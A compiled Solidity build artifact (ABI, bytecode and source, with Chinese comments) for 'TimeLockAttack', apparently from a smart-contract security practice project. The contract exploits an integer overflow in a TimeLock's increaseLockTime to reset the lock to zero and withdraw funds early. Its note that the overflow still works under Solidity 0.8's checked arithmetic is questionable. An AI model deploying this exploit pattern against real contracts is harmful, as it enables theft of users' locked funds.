{
  "contractName": "TimeLockAttack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_timeLockAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attacker",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "timeLock",
      "outputs": [
        {
          "internalType": "contract TimeLock",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516103f73803806103f783398101604081905261002f9161005d565b600080546001600160a01b039092166001600160a01b0319928316179055600180549091163317905561008d565b60006020828403121561006f57600080fd5b81516001600160a01b038116811461008657600080fd5b9392505050565b61035b8061009c6000396000f3fe6080604052600436106100435760003560e01c806312065fe01461004f57806348eb76ee1461006f5780639e5faafc146100a7578063d085835a146100b157600080fd5b3661004a57005b600080fd5b34801561005b57600080fd5b506040514781526020015b60405180910390f35b34801561007b57600080fd5b5060015461008f906001600160a01b031681565b6040516001600160a01b039091168152602001610066565b6100af6100d1565b005b3480156100bd57600080fd5b5060005461008f906001600160a01b031681565b6000341161011a5760405162461bcd60e51b81526020600482015260126024820152714e6565642045544820746f2061747461636b60701b604482015260640160405180910390fd5b60008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561016857600080fd5b505af115801561017c573d6000803e3d6000fd5b50506000805460405163154635dd60e31b81523060048201529194506001600160a01b0316925063aa31aee89150602401602060405180830381865afa1580156101ca573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101ee91906102c7565b905060006101fe826000196102f6565b61020990600161030d565b600054604051631e6bd57960e21b8152600481018390529192506001600160a01b0316906379af55e490602401600060405180830381600087803b15801561025057600080fd5b505af1158015610264573d6000803e3d6000fd5b50506000805460408051633ccfd60b60e01b815290516001600160a01b039092169450633ccfd60b9350600480820193929182900301818387803b1580156102ab57600080fd5b505af11580156102bf573d6000803e3d6000fd5b505050505050565b6000602082840312156102d957600080fd5b5051919050565b634e487b7160e01b600052601160045260246000fd5b600082821015610308576103086102e0565b500390565b60008219821115610320576103206102e0565b50019056fea2646970667358221220f4d910e04bd21348ff12aa9da906e071b160ae11799954ddecbc542f39b795ce64736f6c634300080b0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.11;\n\nimport \"./TimeLock.sol\";\n\n/**\n * TimeLockAttack - 整数溢出攻击合约\n * 攻击原理：利用 increaseLockTime 的整数溢出，将锁定时间变为 0\n */\ncontract TimeLockAttack {\n    TimeLock public timeLock;\n    address public attacker;\n\n    constructor(address _timeLockAddress) {\n        timeLock = TimeLock(_timeLockAddress);\n        attacker = msg.sender;\n    }\n\n    /**\n     * 接收 ETH 的函数\n     */\n    receive() external payable {}\n\n    /**\n     * attack - 发起攻击\n     */\n    function attack() public payable {\n        require(msg.value > 0, \"Need ETH to attack\");\n        \n        // 存款（会设置 lockTime = 当前时间 + 1 week）\n        timeLock.deposit{value: msg.value}();\n        \n        // 计算溢出的值：2^256 - 当前 lockTime + 1\n        // 由于 Solidity 0.8+ 默认有溢出检查，我们使用溢出技巧\n        uint256 currentLockTime = timeLock.getLockTime(address(this));\n        uint256 overflowValue = type(uint256).max - currentLockTime + 1;\n        \n        // 攻击：让锁定时间溢出变为 0\n        timeLock.increaseLockTime(overflowValue);\n        \n        // 提款（此时锁定时间是 0，block.timestamp > 0 永远成立）\n        timeLock.withdraw();\n    }\n\n    /**\n     * 查看攻击合约余额\n     */\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n",
  "sourcePath": "C:\\Users\\ZhuanZ1\\Desktop\\smart-contract-security\\contracts\\TimeLockAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2026-04-24T17:04:26.759Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {
      "attack()": {
        "notice": "attack - 发起攻击"
      },
      "getBalance()": {
        "notice": "查看攻击合约余额"
      }
    },
    "notice": "TimeLockAttack - 整数溢出攻击合约 攻击原理：利用 increaseLockTime 的整数溢出，将锁定时间变为 0",
    "version": 1
  }
}